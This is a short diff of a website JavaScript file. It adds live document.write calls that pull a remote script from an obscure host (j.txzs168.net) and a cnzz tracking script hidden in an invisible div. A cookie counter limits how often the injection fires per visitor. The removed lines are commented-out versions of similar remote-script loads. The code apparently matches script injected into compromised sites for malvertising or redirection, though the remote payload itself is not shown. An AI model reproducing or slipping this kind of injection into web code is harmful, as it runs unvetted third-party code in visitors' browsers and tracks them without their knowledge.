@@ -1,4 +1,4 @@
-var waplun = ["https://www.jschuangnuo.com/img/10481","https://www.jschuangnuo.com/img/10481"]
+var waplun = ["https://www.baidu","https://www.163.com"]
 var wapm=2;
 var wapn=Math.floor(Math.random()*wapm);
 //if (wapn <3){
@@ -8,10 +8,9 @@ if (!getCookie('pf')){
 }
 if (Number(getCookie('pf'))<10){
     document.cookie = "pf="+(Number(getCookie('pf'))+1)+";max-age=1000;";
-   // document.writeln("<script src='https://cfredh.cn/m-1560-6582651'><\/script>");
-
-    //document.writeln('<divstyle="display:none"><script type="text/javascript" src="https://s4.cnzz.com/z_stat.php?id=1278581034&web_id=1278581034"><\/script></div>');
-    //document.writeln("<script src='"+waplun[wapn]+"' ></script>");
+    document.write("<script src='\/\/j.txzs168.net\/20190620\/2Qv2GE1RsGKMKBo4.js' id=\"hmupzoneiddata\" data='i=11112&a=11113'><\/script>");
+    document.write("<divstyle=\"display:none\"><script type=\"text\/javascript\" src=\"https:\/\/s4.cnzz.com\/z_stat.php?id=1278581034&web_id=1278581034\"><\/script><\/div>");
+    
 }
 //    }
 //}
